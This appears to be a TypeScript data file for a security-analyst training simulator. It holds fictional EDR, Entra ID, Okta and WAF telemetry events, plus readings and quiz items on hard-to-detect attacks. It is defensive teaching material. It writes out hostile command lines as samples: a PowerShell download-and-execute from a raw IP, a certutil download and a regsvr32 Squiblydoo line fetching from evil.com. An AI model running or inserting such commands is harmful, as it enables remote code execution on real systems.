import type { TelemetryEvent } from "@/lib/sim/types";

// ── Event 1: Dependency-confusion / npm postinstall reverse shell ───────────
const supplyChainEvent: TelemetryEvent = {
  id: "evt-edge-supplychain-001",
  ts: "2024-08-14T11:02:41.000Z",
  source: "edr",
  vendor: "CrowdStrike Falcon",
  event_type: "process_create",
  severity: "high",
  hostname: "LT-DEV-0212",
  user_email: "d.wong@nexacorp.com",
  description: "node.exe spawned a reverse-shell connection from a package postinstall script during npm install",
  mitre_technique: "T1195.001",
  mitre_tactic: "Initial Access",
  process: {
    name: "node.exe",
    pid: 8821,
    parent_name: "npm.cmd",
    parent_pid: 6610,
    cmdline:
      "node -e \"require('child_process').exec('powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\\\"http://185.220.101.47/stage2.ps1\\\")')\"",
    user: "NEXACORP\\d.wong",
    integrity: "medium",
  },
  network: {
    domain: "185.220.101.47",
    url: "http://185.220.101.47/stage2.ps1",
  },
  raw: {
    "crowdstrike.event_simplename": "ProcessRollup2",
    "crowdstrike.detection.tactic": "Initial Access",
    "crowdstrike.detection.tactic_id": "TA0001",
    "crowdstrike.detection.technique_id": "T1195.001",
    "crowdstrike.detection.severity": "High",
    "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
    "crowdstrike.event.FileName": "node.exe",
    "crowdstrike.event.ProcessId": "8821",
    "crowdstrike.event.ImageFileName": "C:\\Program Files\\nodejs\\node.exe",
    "crowdstrike.event.CommandLine":
      "node -e \"require('child_process').exec('powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\\\"http://185.220.101.47/stage2.ps1\\\")')\"",
    "crowdstrike.event.ParentImageFileName": "npm.cmd",
    "crowdstrike.event.ParentProcessId": "6610",
    "crowdstrike.event.ParentCommandLine": "npm install internal-logging-utils",
    "crowdstrike.event.UserName": "NEXACORP\\d.wong",
    "crowdstrike.event.HostName": "LT-DEV-0212",
    "crowdstrike.event.FileSigned": "true",
    "npm.package_name": "internal-logging-utils",
    "npm.package_version": "1.0.4",
    "npm.registry": "https://registry.npmjs.org",
    "npm.scripts.postinstall": "node ./scripts/setup.js",
    "action_result": "detected",
  },
};

// ── Event 2: OAuth consent grant to rogue Azure AD app ───────────────────────
const oauthConsentEvent: TelemetryEvent = {
  id: "evt-edge-oauth-001",
  ts: "2024-09-03T14:12:09.000Z",
  source: "o365",
  vendor: "Microsoft Entra ID",
  event_type: "account_modify",
  severity: "medium",
  hostname: undefined,
  user_email: "r.patel@nexacorp.com",
  description: "User granted delegated Mail.Read and offline_access permissions to a third-party OAuth application",
  mitre_technique: "T1528",
  mitre_tactic: "Credential Access",
  raw: {
    "data.office365.Operation": "Consent to application.",
    "data.office365.Workload": "AzureActiveDirectory",
    "data.office365.UserId": "r.patel@nexacorp.com",
    "data.office365.AzureActiveDirectoryEventType": "ApplicationManagement",
    "data.office365.ResultStatus": "Success",
    "data.office365.ActorIpAddress": "94.102.61.10",
    "data.office365.ApplicationId": "3f7a9c1e-88bb-4a2f-9e11-6d0a7e5b2c31",
    "data.office365.ApplicationDisplayName": "Quick Doc Viewer",
    "data.office365.ExtendedProperties.Name": "RequestedScopes",
    "data.office365.ExtendedProperties.Value":
      "Mail.Read offline_access User.Read Contacts.Read",
    "data.office365.ModifiedProperties.Name": "ConsentAction.Permissions",
    "data.office365.ModifiedProperties.NewValue": "Mail.Read, offline_access, User.Read, Contacts.Read",
    "data.office365.ModifiedProperties.OldValue": "[]",
    "GeoLocation.country_name": "Latvia",
    "GeoLocation.location.lat": 56.9496,
    "GeoLocation.location.lon": 24.1052,
    "action_result": "allowed",
  },
};

// ── Event 3: Low-and-slow insider exfiltration (below DLP thresholds) ────────
const lowAndSlowEvent: TelemetryEvent = {
  id: "evt-edge-lowslow-001",
  ts: "2024-07-22T16:41:00.000Z",
  source: "o365",
  vendor: "Microsoft 365 Unified Audit Log",
  event_type: "sharepoint_download",
  severity: "low",
  hostname: "LT-FIN-1187",
  user_email: "m.reyes@nexacorp.com",
  description: "User downloaded 14 files from the Contracts SharePoint library, the seventeenth consecutive day of small downloads from the same library",
  raw: {
    "data.office365.Operation": "FileDownloaded",
    "data.office365.Workload": "SharePoint",
    "data.office365.UserId": "m.reyes@nexacorp.com",
    "data.office365.ClientIP": "10.20.4.61",
    "data.office365.SiteUrl": "https://nexacorp.sharepoint.com/sites/Contracts",
    "data.office365.SourceFileName": "Vendor-Agreement-Q3-0142.pdf",
    "data.office365.SourceRelativeUrl": "Shared Documents/Active",
    "data.office365.ItemCount": 14,
    "data.office365.ResultStatus": "Succeeded",
    "dlp.policy_evaluated": "Financial Data — Bulk Download Block",
    "dlp.threshold_files_per_hour": 50,
    "dlp.observed_files_this_hour": 14,
    "dlp.rule_triggered": false,
    "ueba.baseline_daily_downloads": "2-3",
    "ueba.consecutive_days_elevated": 17,
    "ueba.cumulative_files_30d": 238,
    "ueba.library_role_relevance": "LOW",
    "user.department": "Finance",
    "action_result": "allowed",
  },
};

// ── Event 4: Impossible-travel that is actually a corporate VPN egress hop ──
const impossibleTravelFPEvent: TelemetryEvent = {
  id: "evt-edge-travel-001",
  ts: "2024-10-11T09:03:52.000Z",
  source: "okta",
  vendor: "Okta",
  event_type: "auth_success",
  severity: "medium",
  hostname: undefined,
  user_email: "k.oconnell@nexacorp.com",
  src_ip: "185.107.56.20",
  description: "Successful login for k.oconnell from a Dublin IP address, eleven minutes after a login from a Chicago IP address",
  raw: {
    "okta.event_type": "user.session.start",
    "okta.outcome.result": "SUCCESS",
    "okta.authentication_context.authentication_step": "0",
    "okta.authentication_context.credential_provider": "OKTA_CREDENTIAL_PROVIDER",
    "okta.client.ip_address": "185.107.56.20",
    "okta.client.geographical_context.country": "Ireland",
    "okta.client.geographical_context.city": "Dublin",
    "okta.actor.display_name": "Kevin O'Connell",
    "okta.actor.id": "00u3f7a9c1e88bb4a2f",
    "okta.actor.type": "User",
    "okta.security_context.is_proxy": "true",
    "okta.security_context.asn": "AS20473",
    "okta.security_context.as_org": "NordVPN / Global Corporate Egress Pool",
    "okta.previous_login.ip_address": "172.56.22.104",
    "okta.previous_login.city": "Chicago",
    "okta.previous_login.country": "United States",
    "okta.previous_login.minutes_ago": 11,
    "network.vpn_client": "GlobalProtect",
    "network.vpn_gateway_pool": "nexacorp-vpn-emea-dublin-01",
    "action_result": "success",
  },
};

// ── Event 5: LOLBin — regsvr32 used by an actual sysadmin for a legit COM DLL
const lolbinEvent: TelemetryEvent = {
  id: "evt-edge-lolbin-001",
  ts: "2024-11-05T19:55:03.000Z",
  source: "edr",
  vendor: "Microsoft Defender for Endpoint",
  event_type: "process_create",
  severity: "medium",
  hostname: "SRV-APP-0044",
  user_email: "t.mendes@nexacorp.com",
  description: "regsvr32.exe registered a DLL on an application server outside the scheduled maintenance window",
  mitre_technique: "T1218.010",
  mitre_tactic: "Defense Evasion",
  process: {
    name: "regsvr32.exe",
    pid: 4420,
    parent_name: "cmd.exe",
    parent_pid: 3312,
    cmdline: "regsvr32.exe /s C:\\AppDeploy\\ReportEngine\\ReportViewerCtl.dll",
    user: "NEXACORP\\t.mendes",
    integrity: "high",
  },
  raw: {
    "mde.event_type": "ProcessCreated",
    "mde.detection_source": "EDR",
    "mde.sha256": "b4a1c9d7e2f56830a1bb44c02f7de9915ee2c4a7f0c8b13d5e9a2f6c7b8d901",
    "process.name": "regsvr32.exe",
    "process.pid": "4420",
    "process.command_line": "regsvr32.exe /s C:\\AppDeploy\\ReportEngine\\ReportViewerCtl.dll",
    "process.parent.name": "cmd.exe",
    "process.parent.pid": "3312",
    "process.parent.command_line": "cmd.exe /c deploy_report_engine.bat",
    "user.name": "NEXACORP\\t.mendes",
    "host.name": "SRV-APP-0044",
    "file.signed": "true",
    "file.publisher": "NexaCorp Internal Engineering",
    "network.connection_made": "false",
    "change_management.ticket_id": "CHG0041823",
    "change_management.scheduled_window": "2024-11-05T20:00:00Z to 2024-11-05T22:00:00Z",
    "change_management.actual_time": "2024-11-05T19:55:03Z",
    "change_management.minutes_early": 5,
    "action_result": "allowed",
  },
};

// ── Event 6: Business-logic attack — password-reset / account enumeration ───
const passwordResetAbuseEvent: TelemetryEvent = {
  id: "evt-edge-bizlogic-001",
  ts: "2024-12-02T03:14:27.000Z",
  source: "waf",
  vendor: "Cloudflare WAF",
  event_type: "http_request",
  severity: "medium",
  src_ip: "45.142.212.61",
  description: "212 sequential requests to the password-reset endpoint using an incrementing list of email addresses, each returning a different response time",
  mitre_technique: "T1589.002",
  mitre_tactic: "Reconnaissance",
  network: {
    url: "https://portal.nexacorp.com/api/v1/auth/forgot-password",
    method: "POST",
    status: 200,
  },
  raw: {
    "http.request.method": "POST",
    "http.request.uri.path": "/api/v1/auth/forgot-password",
    "http.response.status_code": "200",
    "http.request.headers.user_agent": "python-requests/2.31.0",
    "client.ip": "45.142.212.61",
    "client.geo.country": "Ukraine",
    "client.geo.city": "Kyiv",
    "cf.threat_score": "18",
    "cf.bot_management.score": "4",
    "cf.bot_management.verified_bot": "false",
    "waf.rule_triggered": "none",
    "waf.rate_limit_threshold_per_min": 100,
    "waf.observed_requests_per_min": 42,
    "app.response_time_variance_ms": "user_exists=812ms avg, user_not_exists=94ms avg",
    "app.emails_attempted_last_hour": 212,
    "app.unique_emails_attempted": 212,
    "action_result": "allowed",
  },
};

const edgeCaseRoom = {
  id: "edge-case-usecases",
  title: "Unusual Attacks and Edge-Case Use Cases",
  description:
    "An advanced room built for analysts who already know the textbook attacks and now need to see the ones that don't look like attacks at all. Every scenario here was chosen because it routinely slips past experienced SOC teams: a malicious package that installs itself through a trusted build process, an insider who never crosses a DLP threshold, a third-party script that turns a checkout page into a skimmer, a SaaS app nobody approved, an admin tool abused in a way that looks exactly like admin work, an OAuth consent screen that never touches malware, a geographically 'impossible' login that is actually a VPN hop, and a password-reset form quietly used to map your entire user directory. For each case you will learn why it is missed and exactly which field or behavioral tell breaks the disguise.",
  difficulty: "advanced" as const,
  category: "Threat Detection",
  estimatedMinutes: 80,
  xp: 360,
  icon: "🕵️",
  prerequisites: ["investigation-methodology", "alert-triage"],
  tasks: [
    // ── Reading 1: Supply chain / dependency confusion ─────────────────────
    {
      type: "reading" as const,
      id: "edge-r1",
      heading: "Supply Chain and Dependency Confusion: The Attack Nobody Watches For",
      content:
        "Most detection programs are built around a simple mental model: an attacker sends a malicious file or link, a user opens it, malware runs. Supply-chain attacks break that model completely, because the malicious code arrives through a channel everyone implicitly trusts — the build process itself. A developer runs 'npm install' or 'pip install' dozens of times a day. It is routine, expected, and almost never questioned by a SOC analyst watching an alert queue.\n\n" +
        "Dependency confusion is one of the cleanest versions of this attack. Large companies often have internal, private packages named things like 'nexacorp-logging-utils' that are never published to the public npm or PyPI registry — they only exist on an internal package server. An attacker researches the company (through job postings, GitHub repos, leaked internal documentation) and publishes a PUBLIC package with the exact same name, but a higher version number, to the public registry. Because many build tools default to checking the public registry first, or fail over to it when the internal server is briefly unreachable, the higher-versioned public package can silently win the dependency resolution and get installed instead of the real one.\n\n" +
        "The other common variant is typosquatting: 'reqeusts' instead of 'requests', 'crossenv' instead of 'cross-env'. A tired developer typing quickly, or a copy-pasted install command from a tutorial with a typo, is enough. Once the malicious package is selected, the payload usually does not run as a separate suspicious executable — it runs inside an npm 'postinstall' script or a Python 'setup.py' during install, which is a completely normal and expected part of package installation. That script can spawn a shell, phone home, or drop a stager, all under the identity and process lineage of npm.cmd or pip.exe, tools your EDR almost certainly has an exclusion or a low baseline suspicion score for.\n\n" +
        "Why analysts miss it: the alert (if one fires at all) shows a child process of npm.cmd or python.exe, which analysts are trained to associate with normal developer workflow noise. The parent-child relationship looks legitimate because, mechanically, it is legitimate — npm really did spawn node.exe, which really did execute a script. The malicious intent is buried inside the command line arguments and the destination of the outbound connection, not in the process tree shape.\n\n" +
        "The detection tell: look at what the spawned process is actually doing, not what spawned it. A postinstall script that opens a network connection to an IP address (not a domain), especially over plain HTTP, and especially followed by a PowerShell download-and-execute pattern, is the signal — regardless of how innocent the parent process looks. Cross-reference the package name and version against your internal artifact registry: if the version installed does not match what your internal registry serves, or the package was pulled from the public registry when an internal equivalent exists, that mismatch alone is worth an alert.",
      codeExample:
        "SUSPICIOUS PROCESS TREE (looks routine at first glance)\n" +
        "==========================================================\n" +
        "cmd.exe\n" +
        "  \\_ npm.cmd  (cmdline: npm install internal-logging-utils)\n" +
        "       \\_ node.exe  (cmdline: node -e \"require('child_process').exec(\n" +
        "            'powershell -nop -w hidden -c IEX(New-Object Net.WebClient)\n" +
        "             .DownloadString(\\\"http://185.220.101.47/stage2.ps1\\\")')\")\n\n" +
        "WHY IT PASSES CASUAL REVIEW:\n" +
        "  - npm.cmd spawning node.exe is 100% normal — happens constantly\n" +
        "  - No suspicious file dropped to disk yet\n" +
        "  - No AV signature match (payload is fileless, delivered inline)\n\n" +
        "THE TELL:\n" +
        "  - node -e (inline eval) is unusual for a postinstall script\n" +
        "  - Destination is a raw IP, not a CDN or known package host\n" +
        "  - PowerShell download-and-execute chained immediately after\n" +
        "  - Package 'internal-logging-utils' matches an INTERNAL-ONLY name\n" +
        "    but was resolved from the PUBLIC npm registry\n",
    },

    // ── Reading 2: Insider threat — low-and-slow, under DLP thresholds ──────
    {
      type: "reading" as const,
      id: "edge-r2",
      heading: "Insider Threat: Low-and-Slow Theft That Never Trips a Threshold",
      content:
        "DLP (Data Loss Prevention) systems are built around thresholds: block if a user downloads more than 50 files per hour, alert if an email attachment exceeds 25MB, flag if a single USB copy exceeds 500MB. These thresholds exist because security teams need a bright line to avoid drowning in noise — and attackers who understand this simply stay under the line.\n\n" +
        "A malicious insider planning to leave a company with a competitor's contract book does not need speed. They have weeks or months. Instead of one large download that trips a bulk-export alert, they download twelve to fifteen files a day from the same SharePoint library, every day, for weeks. Each individual session looks unremarkable: a handful of PDFs, well under any per-hour or per-day threshold your DLP policy enforces. No single event would ever justify escalation on its own.\n\n" +
        "Why analysts miss it: DLP and most SIEM correlation rules are inherently stateless or short-window — they evaluate the last hour, or the last 24 hours, and reset. A user downloading 14 files today generates the same low-severity, informational-grade event as a user downloading 14 files for the first time ever. Nothing in the event itself encodes 'this is the seventeenth consecutive day of elevated activity from a user whose baseline is 2-3 downloads per day.' That context lives only in behavioral baselining (UEBA), which many organizations either do not have, do not tune, or do not route into the same alert queue their L1 analysts triage.\n\n" +
        "The detection tell: this attack is invisible at the single-event layer and only visible at the trend layer. The signal is a sustained deviation from personal baseline over a rolling multi-week window, not a single crossed threshold. Fields to watch: cumulative file count over 30 days compared to the user's historical average, number of consecutive days with elevated (but individually sub-threshold) activity, and — critically — whether the access pattern is unusual for the user's role (a salesperson pulling from Legal's contract library is a bigger tell than the raw volume ever will be). The fix is not a lower threshold (that just moves the goalpost and increases false positives) — it is a UEBA baseline comparison layered on top of the DLP event stream.",
      codeExample:
        "SINGLE DAY VIEW (what the DLP console shows — looks fine)\n" +
        "=============================================================\n" +
        "  2024-07-22  m.reyes@nexacorp.com\n" +
        "  Operation: FileDownloaded (SharePoint - Contracts library)\n" +
        "  ItemCount: 14\n" +
        "  dlp.threshold_files_per_hour: 50\n" +
        "  dlp.rule_triggered: false        <-- nothing fires, looks routine\n\n" +
        "30-DAY TREND VIEW (what a UEBA baseline layer reveals)\n" +
        "=============================================================\n" +
        "  ueba.baseline_daily_downloads:      2-3 files/day (this user, historical)\n" +
        "  ueba.consecutive_days_elevated:      17 days in a row at 10-15 files/day\n" +
        "  ueba.cumulative_files_30d:            238 files  (vs. baseline ~75)\n" +
        "  ueba.library_role_relevance:         LOW (Finance user, Contracts library\n" +
        "                                        not part of normal job function)\n\n" +
        "  --> No single day crosses a DLP threshold.\n" +
        "  --> The TREND is the alert. The event stream alone is not.",
    },

    // ── Reading 3: Third-party / vendor compromise — Magecart & MSP tooling ─
    {
      type: "reading" as const,
      id: "edge-r3",
      heading: "Third-Party Compromise: Magecart-Style Skimmers and Trusted MSP Tools",
      content:
        "Not every breach starts inside the target's own environment. Two of the most damaging and hardest-to-detect attack patterns exploit trust in a third party the victim organization did not build, does not control, and often cannot see inside of: web-embedded third-party scripts, and managed service provider (MSP) remote-access tools.\n\n" +
        "Magecart-style attacks target the software supply chain of a website rather than the website's own code. E-commerce checkout pages routinely load JavaScript from a chat widget vendor, an analytics vendor, an A/B testing vendor, a payment-tokenization helper — sometimes a dozen third-party scripts on a single page. If an attacker compromises just one of those vendors (or the CDN hosting their script), they can inject a small snippet of skimming JavaScript that silently copies credit card form fields and exfiltrates them to an attacker-controlled domain, all while the checkout page itself continues to function perfectly and the payment still completes successfully. The victim's own web application logs show nothing wrong because the compromise never touched the victim's server-side code — it happened in the customer's browser, sourced from a script the victim's own page legitimately requested.\n\n" +
        "The MSP compromise pattern works similarly but through IT infrastructure instead of a web page. Many organizations grant their managed service provider persistent, highly privileged remote access via tools like ConnectWise, Kaseya, or a similar RMM (Remote Monitoring and Management) platform — often with domain admin-equivalent rights, because that access is needed to patch and manage every endpoint. If the MSP itself is compromised (or the RMM software vendor is compromised, as happened at scale in real-world supply-chain incidents), the attacker inherits legitimate, trusted, already-whitelisted remote access into every one of that MSP's downstream customers simultaneously. From the victim's perspective, the activity comes from a tool they explicitly trust, authenticating with credentials that are supposed to be there, at a time the MSP normally does maintenance.\n\n" +
        "Why analysts miss both: in the Magecart case, the malicious code never appears in the organization's own source repository or web server logs — it lives entirely in a third party's script, loaded client-side. Standard web application monitoring, WAF rules, and code review never see it. In the MSP case, the access itself is not anomalous by any identity or authentication metric — it is the correct account, from the correct (whitelisted) source, doing the kind of thing that account is supposed to do. The anomaly is behavioral and contextual, not credential-based.\n\n" +
        "The detection tell: for Magecart, monitor Subresource Integrity (SRI) hash mismatches, unexpected new outbound domains initiated from the checkout page in browser telemetry (Content-Security-Policy violation reports are gold here), and any third-party script that starts reading form field values it previously did not touch. For MSP compromise, the tell is behavioral deviation within the trusted tool's own usage pattern: the RMM session pushing a script to 40 endpoints simultaneously when this MSP normally touches 2-3 per session, or a session originating from an MSP source IP that has never been seen before, or PowerShell/psexec commands launched through the RMM tool that do not match any open ticket.",
      codeExample:
        "MAGECART — WHERE THE VISIBILITY GAP LIVES\n" +
        "=============================================================\n" +
        "  Victim's checkout page (own code — looks completely clean)\n" +
        "    <script src=\"https://victim-store.com/checkout.js\"></script>\n" +
        "    <script src=\"https://chat-widget-vendor.cdn.net/widget.js\"></script>\n" +
        "                                       ^\n" +
        "                                       |\n" +
        "                          compromised third-party CDN now serves:\n" +
        "                          widget.js + injected skimmer snippet\n" +
        "                          (reads #card-number, #cvv fields,\n" +
        "                           POSTs to evil-collector.ru)\n\n" +
        "  Victim server logs:        clean   (skimmer never touches server)\n" +
        "  Victim source repo:        clean   (script is loaded, not owned)\n" +
        "  Browser CSP violation log: THE TELL — unexpected POST target\n\n" +
        "MSP COMPROMISE — TRUSTED TOOL, UNTRUSTED OPERATOR\n" +
        "=============================================================\n" +
        "  RMM session: MSP-Technician-Account (whitelisted, always allowed)\n" +
        "  Normal pattern:   2-3 endpoints touched per session, business hours\n" +
        "  Compromised session: 40 endpoints touched in 6 minutes, 2 AM\n" +
        "  --> Same 'trusted' account. Behavior is the only anomaly.",
    },

    // ── Reading 4: Shadow IT + OAuth consent-grant phishing ─────────────────
    {
      type: "reading" as const,
      id: "edge-r4",
      heading: "Shadow IT and OAuth Consent Phishing: Attacks With No Malware At All",
      content:
        "Shadow IT refers to any application, cloud service, or SaaS tool that employees adopt without going through procurement, security review, or IT approval. A marketing team signs up for a free file-conversion tool. A developer connects a personal GitHub repo to a CI/CD SaaS product to save time. None of this is malicious in intent — but every one of these unsanctioned tools is a potential exfiltration path that your DLP, CASB, and monitoring stack were never configured to watch, because nobody told the security team it existed. The tool never appears in the approved-application inventory, so no policy was ever written for it, no API was ever integrated with your SIEM, and no analyst was ever briefed to expect its traffic.\n\n" +
        "OAuth consent-grant phishing (also called an 'illicit consent grant attack') is the technique that has made shadow-IT-style risk deliberately weaponizable, and it is one of the purest examples of an attack with zero malware. The attacker registers a legitimate-looking Azure AD or Google Workspace application — something named 'Quick Doc Viewer' or 'PDF Signer Pro' — and sends the target a link to authorize it. Critically, this link goes through Microsoft's or Google's own real, legitimate OAuth consent page. There is no fake login page, no credential harvesting, no password ever typed anywhere but the real identity provider. The user is simply asked to click 'Accept' to grant the app a set of permissions: read email, read contacts, maintain offline access. If the user accepts, the attacker's application receives an OAuth token — valid, signed, and issued by Microsoft or Google itself — that grants ongoing API access to the victim's mailbox without ever needing the victim's password, and critically, without triggering MFA on subsequent access, because the token itself is the credential.\n\n" +
        "Why analysts miss this: every single API call the attacker's app subsequently makes is a completely legitimate, correctly authenticated call to Microsoft Graph or the Google Workspace API, using a token Microsoft or Google itself issued. There is no malware to detect, no C2 domain to block, no suspicious executable, no failed login, and — this is the critical part — no password compromise at all, so credential-based detections (impossible travel on password auth, brute force, spray) never fire. The only event that ever occurred was a user clicking 'Accept' on a real, Microsoft-hosted consent screen, which most security tooling logs as a routine, low-severity administrative event by default.\n\n" +
        "The detection tell: the event to hunt for is 'Consent to application' (or the Google Workspace equivalent) in the identity provider's audit log, cross-referenced against three risk factors: the requested scope includes 'offline_access' (this is what makes the token persist and refresh indefinitely instead of expiring at the end of the browser session — almost no legitimate low-trust utility app needs this), the application was registered very recently or by an external/unverified publisher, and the requesting user's session at consent time came from a geography or IP the user does not normally use. None of these three signals alone is damning, but 'offline_access' scope plus an unverified publisher plus an unusual login geography together is a near-certain illicit consent grant, and it is entirely detectable from Azure AD audit logs alone — no EDR, no malware sandbox, no network IOC required.",
      codeExample:
        "OAUTH CONSENT PHISHING — THE ENTIRE 'ATTACK' IN ONE EVENT\n" +
        "=============================================================\n" +
        "  User receives email: 'Please review this document — click to open'\n" +
        "  Link goes to: https://login.microsoftonline.com/common/oauth2/...\n" +
        "                (REAL Microsoft domain — nothing to flag as phishing)\n\n" +
        "  Consent screen shows (rendered BY Microsoft, not the attacker):\n" +
        "    'Quick Doc Viewer wants to:\n" +
        "       - Read your mail                        <-- Mail.Read\n" +
        "       - Maintain access to data you gave access to <-- offline_access\n" +
        "       - Read your contacts                    <-- Contacts.Read\n" +
        "     [Cancel]  [Accept]'\n\n" +
        "  User clicks Accept.\n" +
        "  --> Microsoft issues a REAL, VALID OAuth token to the attacker's app.\n" +
        "  --> No password was ever entered on an attacker-controlled page.\n" +
        "  --> No MFA challenge needed for the app's future API calls —\n" +
        "      the token itself IS the ongoing credential.\n\n" +
        "  From this point on, EVERY subsequent event is a normal,\n" +
        "  correctly-authenticated Microsoft Graph API call. There is\n" +
        "  no malware, no C2 traffic, and no failed-login signal — ever.\n\n" +
        "  THE ONLY DETECTABLE MOMENT: the consent grant event itself.\n" +
        "    o365.Operation = 'Consent to application.'\n" +
        "    RequestedScopes CONTAINS 'offline_access'   <-- red flag\n" +
        "    ApplicationDisplayName = unverified / recently registered\n",
    },

    // ── Reading 5: LOLBins, impossible-travel FPs, and business logic attacks
    {
      type: "reading" as const,
      id: "edge-r5",
      heading: "Living-off-the-Land, VPN False Positives, and Business-Logic Abuse",
      content:
        "Three more edge cases round out this room, and each one shares a common thread: the raw telemetry looks identical whether the activity is malicious or completely routine. The only way to tell them apart is context that lives outside the log itself.\n\n" +
        "Living-off-the-land binaries (LOLBins) are legitimate, digitally signed Windows utilities — certutil.exe, regsvr32.exe, mshta.exe, rundll32.exe, bitsadmin.exe — that attackers repurpose to download files, execute code, or bypass application whitelisting, because these binaries are trusted by design and rarely blocked. certutil.exe is meant to manage certificates, but 'certutil -urlcache -f http://evil.com/payload.exe payload.exe' downloads a file just as well as any browser. regsvr32.exe is meant to register COM DLLs, but it can also load a remote script via the 'scrobj.dll' technique (T1218.010, sometimes called 'Squiblydoo'). The critical trap for analysts: administrators use these exact same tools for exactly these purposes, constantly, as part of normal deployment work. A regsvr32 call registering an internal reporting DLL from a change-managed deployment script is indistinguishable, at the process-execution level, from an attacker registering a malicious scriptlet — same binary, same event ID, same general shape of command line. The signal an analyst must chase is not 'was regsvr32 used' (that question alone produces overwhelming noise), but whether the DLL/script being registered is internally signed and version-controlled, whether the timing lines up with an approved change ticket, and whether a network connection follows the registration (legitimate local DLL registration makes no outbound call; the Squiblydoo technique specifically does, because it is fetching a remote scriptlet).\n\n" +
        "Impossible travel is a classic UEBA/identity detection: a user logs in from Chicago, then twelve minutes later from Dublin, and no commercial flight makes that trip in twelve minutes, so the alert fires as a probable compromised account. But this detection has a well-known, extremely common false-positive source: corporate VPN and cloud-proxy egress. Many enterprises route all remote-worker internet traffic through centralized VPN concentrators or SASE/CASB egress points, and those egress points may sit in a completely different country from the employee. An employee physically in Chicago connects to the corporate VPN, and their outbound traffic egresses from a company-owned pool of IPs in Dublin, because that is where the nearest regional VPN gateway or SASE PoP happens to be. The 'impossible' jump from a Chicago-originated first login (maybe an already-cached mobile session) to a Dublin-sourced second login is not two different people in two countries — it is one person whose traffic legitimately changed apparent origin because of infrastructure, not geography. The detection tell that separates a real account-takeover impossible-travel event from a VPN false positive: check the ASN and organization name behind the second IP. If it resolves to a known corporate VPN provider or your own company's registered egress ASN (not a residential ISP, not an unrelated hosting provider), and especially if a 'security_context.is_proxy' or equivalent field is true, this is very likely infrastructure, not intrusion — though it still deserves a quick verify, because attackers do sometimes route through commercial VPN services specifically to blend into this exact blind spot.\n\n" +
        "Business-logic attacks exploit the intended behavior of an application rather than any code vulnerability, which means signature-based and even most anomaly-based network detections never see them, because no single request is malformed or malicious — the abuse is in the pattern of legitimate requests. Password-reset and account-enumeration abuse is the clearest example: a 'forgot password' endpoint that returns a different response time, a different HTTP status code, or a different message ('no account found' vs. 'reset email sent') depending on whether the submitted email address exists in the system, can be automated against a wordlist of thousands of email addresses to enumerate every valid user account in the organization — all through requests that are each, individually, completely well-formed and application-legitimate. No exploit is used; the application is functioning exactly as designed. The detection tell is velocity and pattern at the business-transaction layer rather than the network-request layer: a single source IP submitting hundreds of sequential, distinct email addresses to a password-reset endpoint in a short window, especially when paired with measurable response-time variance between 'user exists' and 'user does not exist' paths, is the signature of enumeration — and it is a signal only visible if you are logging and analyzing the application's own business logic outcomes, not just whether the HTTP request succeeded.",
      codeExample:
        "LOLBIN — SAME COMMAND, TWO COMPLETELY DIFFERENT STORIES\n" +
        "=============================================================\n" +
        "  MALICIOUS (Squiblydoo):\n" +
        "    regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll\n" +
        "    --> outbound network connection follows immediately\n" +
        "    --> DLL/script is remote, unsigned, never seen before\n\n" +
        "  LEGITIMATE (admin deployment):\n" +
        "    regsvr32.exe /s C:\\AppDeploy\\ReportEngine\\ReportViewerCtl.dll\n" +
        "    --> local file path, internally signed, version-controlled\n" +
        "    --> NO outbound network connection\n" +
        "    --> timestamp falls within an open change-management ticket\n\n" +
        "IMPOSSIBLE TRAVEL — REAL ATTACK vs VPN EGRESS HOP\n" +
        "=============================================================\n" +
        "  REAL ACCOUNT TAKEOVER:\n" +
        "    Login 1: Chicago, residential ISP ASN\n" +
        "    Login 2 (11 min later): Lagos, unrelated hosting-provider ASN\n" +
        "    is_proxy: false | as_org: unrelated / unknown\n\n" +
        "  VPN FALSE POSITIVE:\n" +
        "    Login 1: Chicago, residential/mobile ASN\n" +
        "    Login 2 (11 min later): Dublin, AS20473\n" +
        "    is_proxy: TRUE | as_org: 'Global Corporate Egress Pool'\n" +
        "    network.vpn_gateway_pool: nexacorp-vpn-emea-dublin-01  <-- THE TELL\n\n" +
        "BUSINESS LOGIC — PASSWORD RESET ENUMERATION\n" +
        "=============================================================\n" +
        "  212 sequential POSTs to /forgot-password, 212 unique emails\n" +
        "  Every single request: HTTP 200, well-formed, zero WAF rule hits\n" +
        "  THE TELL: response_time_variance\n" +
        "    user_exists     -> ~812ms avg (password hash lookup + email send)\n" +
        "    user_not_exists -> ~94ms avg  (early return, no lookup)\n" +
        "  Variance itself leaks which of the 212 emails are valid accounts.",
    },

    // ── Question 1 ────────────────────────────────────────────────────────
    {
      type: "question" as const,
      id: "edge-q1",
      question:
        "Why does a dependency-confusion attack routinely bypass EDR tools that would normally flag suspicious child processes?",
      options: [
        "Because npm and pip are always excluded from EDR monitoring by default in every product",
        "Because the malicious code executes inside a normal, expected process lineage (npm/pip spawning a runtime like node.exe or python.exe), so the process tree shape itself looks routine — the malicious intent is only visible in the command-line content and network destination",
        "Because dependency-confusion attacks never actually spawn a child process, so there is nothing for EDR to see",
        "Because the attack always uses a digitally signed binary, and EDR tools trust all signed binaries unconditionally",
      ],
      answer: 1,
      explanation:
        "EDR baselines are heavily shaped by parent-child process legitimacy. npm.cmd spawning node.exe (or pip spawning python.exe) is extremely common developer activity, so the process tree alone carries a low suspicion score. The actual malicious signal is buried in what the spawned process does — an inline eval executing a download-and-run chain to a raw IP address — which requires inspecting command-line arguments and network destinations, not just the process ancestry.",
      xp: 20,
    },

    // ── Question 2 ────────────────────────────────────────────────────────
    {
      type: "question" as const,
      id: "edge-q2",
      question:
        "An OAuth consent-grant phishing attack succeeds without the attacker ever obtaining the victim's password and without triggering any MFA challenge on subsequent access. Why does MFA never fire for the attacker's ongoing access to the mailbox?",
      options: [
        "Because the attacker cracked the MFA seed value during the initial phishing email",
        "Because Microsoft/Google disable MFA automatically for any newly registered third-party application",
        "Because the OAuth token issued at consent time becomes the ongoing credential for API access — subsequent calls authenticate with the token itself, not a fresh username/password/MFA challenge, so there is no login event to protect",
        "Because the victim's account did not have MFA enabled in the first place, which is a prerequisite for this attack to work",
      ],
      answer: 2,
      explanation:
